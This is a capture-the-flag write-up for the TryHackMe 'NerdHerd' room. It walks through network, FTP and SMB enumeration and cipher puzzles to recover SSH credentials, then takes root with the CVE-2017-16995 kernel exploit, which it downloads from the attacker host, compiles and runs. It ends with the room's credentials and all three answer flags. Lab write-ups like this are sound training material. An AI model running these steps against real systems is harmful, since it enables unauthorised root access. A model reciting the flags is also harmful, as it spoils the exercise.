# NerdHerd

Hack your way into this easy/medium level legendary TV series "Chuck" themed box!

[NerdHerd](https://tryhackme.com/room/nerdherd)

## Topic's

- Network Enumeration
- Linux Enumeration
- FTP Enumeration
- SMB Enumeration
- Steganography
- Cryptography
  - Base64
  - Vigenère
- CVE-2017-16995 - Linux Kernel < 4.13.9

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 PWN

This is the very first vulnerable machine that I've created. So, feel free to share your opinions/advices with me on my DC: 0xpr0N3rd (alright maybe for nudges too)

I've enjoyed developing this box and I hope you enjoy it while solving.

Hack this machine before nerd herd fellas arrive, happy hacking!!!

NOTE # Please do not stream or publish any write-ups for this room at least 1 week after the release.

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ sudo nmap -A -sS -sC -sV -Pn -p- 10.10.48.80
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-31 22:59 CET
Nmap scan report for 10.10.48.80
Host is up (0.050s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11 03:45 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 0c:84:1b:36:b2:a2:e1:11:dd:6a:ef:42:7b:0d:bb:43 (RSA)
|   256 e2:5d:9e:e7:28:ea:d3:dd:d4:cc:20:86:a3:df:23:b8 (ECDSA)
|_  256 ec:be:23:7b:a9:4c:21:85:bc:a8:db:0e:7c:39:de:49 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1337/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/31%OT=21%CT=1%CU=37433%PV=Y%DS=2%DC=T%G=Y%TM=5F9DDE
OS:A2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)SE
OS:Q(SP=105%GCD=1%ISR=107%TI=Z%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%
OS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2
OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m58s, deviation: 1h09m16s, median: 0s
|_nbstat: NetBIOS name: NERDHERD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nerdherd
|   NetBIOS computer name: NERDHERD\x00
|   Domain name: \x00
|   FQDN: nerdherd
|_  System time: 2020-11-01T00:01:04+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-31T22:01:04
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   32.15 ms 10.8.0.1
2   67.41 ms 10.10.48.80

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.41 seconds
```

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ ftp 10.10.132.29
Connected to 10.10.132.29.
220 (vsFTPd 3.0.3)
Name (10.10.132.29:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11 03:45 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11 03:45 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11 03:03 ..
drwxr-xr-x    2 ftp      ftp          4096 Sep 14 18:35 .jokesonyou
-rw-rw-r--    1 ftp      ftp         89894 Sep 11 03:45 youfoundme.png
226 Directory send OK.
ftp> get .jokesonyou
local: .jokesonyou remote: .jokesonyou
200 PORT command successful. Consider using PASV.
550 Failed to open file.
ftp> cd .jokesonyou
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 14 18:35 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11 03:45 ..
-rw-r--r--    1 ftp      ftp            28 Sep 14 18:35 hellon3rd.txt
226 Directory send OK.
ftp> get hellon3rd.txt
local: hellon3rd.txt remote: hellon3rd.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for hellon3rd.txt (28 bytes).
226 Transfer complete.
28 bytes received in 0.08 secs (0.3231 kB/s)
ftp>
```

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ cat hellon3rd.txt
all you need is in the leet
```

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ exiftool youfoundme.png
ExifTool Version Number         : 12.06
File Name                       : youfoundme.png
Directory                       : .
File Size                       : 88 kB
File Modification Date/Time     : 2020:10:31 21:15:39+01:00
File Access Date/Time           : 2020:10:31 21:15:49+01:00
File Inode Change Date/Time     : 2020:10:31 21:15:39+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 894
Image Height                    : 894
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 3543
Pixels Per Unit Y               : 3543
Pixel Units                     : meters
Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2010-10-26T08:00:31-07:00
Datemodify                      : 2010-10-26T08:00:31-07:00
Software                        : www.inkscape.org
EXIF Orientation                : 1
Exif Byte Order                 : Big-endian (Motorola, MM)
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
Flashpix Version                : 0100
Owner Name                      : fijbxslz
Image Size                      : 894x894
Megapixels                      : 0.799
```

`Owner Name : fijbxslz`

[https://www.boxentriq.com/code-breaking/cipher-identifier](https://www.boxentriq.com/code-breaking/cipher-identifier)

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ smbclient -L \\10.10.48.80
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        nerdherd_classified Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ smbclient \\\\10.10.48.80\\nerdherd_classified
Enter WORKGROUP\kali's password:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

<!--
	these might help:
		Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
-->

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ echo 'Y2liYXJ0b3dza2k=' | base64 -d
cibartowski
```

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ echo 'aGVoZWdvdTwdasddHlvdQ==' | base64 -d
hehegou
```

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ enum4linux 10.10.132.29
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov  6 13:49:43 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.132.29
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================
|    Enumerating Workgroup/Domain on 10.10.132.29    |
 ====================================================
[+] Got domain/workgroup name: WORKGROUP

 ============================================
|    Nbtstat Information for 10.10.132.29    |
 ============================================
Looking up status of 10.10.132.29
        NERDHERD        <00> -         B <ACTIVE>  Workstation Service
        NERDHERD        <03> -         B <ACTIVE>  Messenger Service
        NERDHERD        <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 =====================================
|    Session Check on 10.10.132.29    |
 =====================================
[+] Server 10.10.132.29 allows sessions using username '', password ''

 ===========================================
|    Getting domain SID for 10.10.132.29    |
 ===========================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================
|    OS information on 10.10.132.29    |
 ======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.132.29 from smbclient:
[+] Got OS info for 10.10.132.29 from srvinfo:
        NERDHERD       Wk Sv PrQ Unx NT SNT nerdherd server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 =============================
|    Users on 10.10.132.29    |
 =============================
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck    Name: ChuckBartowski    Desc:

user:[chuck] rid:[0x3e8]

 =========================================
|    Share Enumeration on 10.10.132.29    |
 =========================================

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        nerdherd_classified Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.132.29
//10.10.132.29/print$   Mapping: DENIED, Listing: N/A
//10.10.132.29/nerdherd_classified      Mapping: DENIED, Listing: N/A
//10.10.132.29/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ====================================================
|    Password Policy Information for 10.10.132.29    |
 ====================================================


[+] Attaching to 10.10.132.29 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] NERDHERD
        [+] Builtin

[+] Password Info for Domain: NERDHERD

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 =======================================================================
|    Users on 10.10.132.29 via RID cycling (RIDS: 500-550,1000-1050)    |
 =======================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2306820301-2176855359-2727674639
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\chuck (Local User)
S-1-22-1-1002 Unix User\ftpuser (Local User)
[+] Enumerating users using SID S-1-5-21-2306820301-2176855359-2727674639 and logon username '', password ''
S-1-5-21-2306820301-2176855359-2727674639-500 *unknown*\*unknown* (8)
S-1-5-21-2306820301-2176855359-2727674639-501 NERDHERD\nobody (Local User)
S-1-5-21-2306820301-2176855359-2727674639-513 NERDHERD\None (Domain Group)
S-1-5-21-2306820301-2176855359-2727674639-1000 NERDHERD\chuck (Local User)

 =============================================
|    Getting printer info for 10.10.132.29    |
 =============================================
No printers returned.


enum4linux complete on Fri Nov  6 13:53:33 2020
```

[https://www.youtube.com/watch?v=9Gc4QTqslN4](https://www.youtube.com/watch?v=9Gc4QTqslN4)

[https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('BirdistheWord')&input=ZmlqYnhzbHo](<https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('BirdistheWord')&input=ZmlqYnhzbHo>)

`easypass`

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ smbclient -U chuck \\\\10.10.132.29\\nerdherd_classified
Enter WORKGROUP\chuck's password:
Try "help" to get a list of possible commands.
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> ls
  .                                   D        0  Fri Sep 11 03:29:53 2020
  ..                                  D        0  Thu Nov  5 21:44:40 2020
  secr3t.txt                          N      125  Fri Sep 11 03:29:53 2020

                8124856 blocks of size 1024. 3414104 blocks available
smb: \> get secr3t.txt
getting file \secr3t.txt of size 125 as secr3t.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \>
```

[http://10.10.132.29:1337/this1sn0tadirect0ry/](http://10.10.132.29:1337/this1sn0tadirect0ry/)

[http://10.10.132.29:1337/this1sn0tadirect0ry/creds.txt](http://10.10.132.29:1337/this1sn0tadirect0ry/creds.txt)

```
alright, enough with the games.

here, take my ssh creds:

	chuck : th1s41ntmypa5s
```

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ ssh chuck@10.10.132.29
The authenticity of host '10.10.132.29 (10.10.132.29)' can't be established.
ECDSA key fingerprint is SHA256:Zf9lZPGnZpw5EjeSwBXbXbeyTILyhw998cnd87rFDTU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.132.29' (ECDSA) to the list of known hosts.
chuck@10.10.132.29's password:
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

747 packages can be updated.
522 updates are security updates.

Last login: Wed Oct 14 17:03:42 2020 from 22.0.97.11
chuck@nerdherd:~$ ls -la
total 136
drwxr-xr-x 19 chuck chuck 4096 Kas  5 22:44 .
drwxr-xr-x  4 root  root  4096 Eyl 11 03:43 ..
-rw-------  1 chuck chuck  742 Kas  5 22:44 .bash_history
-rw-r--r--  1 chuck chuck  220 Eyl 11 01:17 .bash_logout
-rw-r--r--  1 chuck chuck 3771 Eyl 11 01:17 .bashrc
drwx------ 14 chuck chuck 4096 Eyl 14 19:20 .cache
drwx------  3 chuck chuck 4096 Eyl 11 03:31 .compiz
drwx------ 15 chuck chuck 4096 Kas  5 22:42 .config
drwxr-xr-x  2 chuck chuck 4096 Kas  5 22:43 Desktop
-rw-r--r--  1 chuck chuck   25 Eyl 11 01:32 .dmrc
drwxr-xr-x  2 chuck chuck 4096 Eyl 11 01:32 Documents
drwxr-xr-x  3 chuck chuck 4096 Eyl 11 04:45 Downloads
-rw-r--r--  1 chuck chuck 8980 Eyl 11 01:17 examples.desktop
drwx------  2 chuck chuck 4096 Eki 19 11:38 .gconf
drwx------  3 chuck chuck 4096 Kas  5 22:40 .gnupg
-rw-------  1 chuck chuck 4564 Kas  5 22:40 .ICEauthority
drwx------  3 chuck chuck 4096 Eyl 11 01:32 .local
drwx------  4 chuck chuck 4096 Eyl 11 02:03 .mozilla
drwxr-xr-x  2 chuck chuck 4096 Eyl 11 01:32 Music
drwxrwxr-x  2 chuck chuck 4096 Eyl 11 03:29 .nano
drwxr-xr-x  2 root  root  4096 Eyl 11 04:29 nerdherd_classified
drwxr-xr-x  2 chuck chuck 4096 Eyl 11 01:32 Pictures
-rw-r--r--  1 chuck chuck  655 Eyl 11 01:17 .profile
drwxr-xr-x  2 chuck chuck 4096 Eyl 11 01:32 Public
-rw-r--r--  1 chuck chuck    0 Eyl 11 01:38 .sudo_as_admin_successful
drwxr-xr-x  2 chuck chuck 4096 Eyl 11 01:32 Templates
-rw-rw-r--  1 chuck chuck   46 Eyl 14 19:26 user.txt
drwxr-xr-x  2 chuck chuck 4096 Eyl 11 01:32 Videos
-rw-------  1 root  root   511 Eyl 11 02:58 .viminfo
-rw-------  1 chuck chuck   53 Kas  5 22:40 .Xauthority
-rw-------  1 chuck chuck   82 Kas  5 22:40 .xsession-errors
-rw-------  1 chuck chuck   82 Kas  5 20:26 .xsession-errors.old
chuck@nerdherd:~$ cat user.txt
THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}
```

[Linux Kernel < 4.13.9](https://www.exploit-db.com/exploits/45010)

`CVE-2017-16995 - Linux Kernel < 4.13.9`

```
chuck@nerdherd:~$ which gcc
/usr/bin/gcc
chuck@nerdherd:~$ wget 10.8.106.222/45010.c
--2020-11-06 15:18:07--  http://10.8.106.222/45010.c
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13728 (13K) [text/plain]
Saving to: ‘45010.c’

45010.c                100%[==========================>]  13,41K  --.-KB/s    in 0,03s

2020-11-06 15:18:07 (408 KB/s) - ‘45010.c’ saved [13728/13728]

chuck@nerdherd:~$ gcc 45010.c -o exploit
chuck@nerdherd:~$ ./exploit
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003b52f200
[*] Leaking sock struct from ffff88003c882d00
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88003afbc780
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88003afbc780
[*] credentials patched, launching shell...
# whoami
root
# cat /root/root.txt
cmon, wouldnt it be too easy if i place the root flag here?

# locate root.txt
/opt/.root.txt
/root/root.txt
# cat /opt/.root.txt
nOOt nOOt! you've found the real flag, congratz!

THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}
# cd /root
# cat .bash_history | grep -i -a thm
THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}
```

1. User Flag

`THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}`

2. Root Flag

`THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}`

3. Bonus Flag

`THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}`
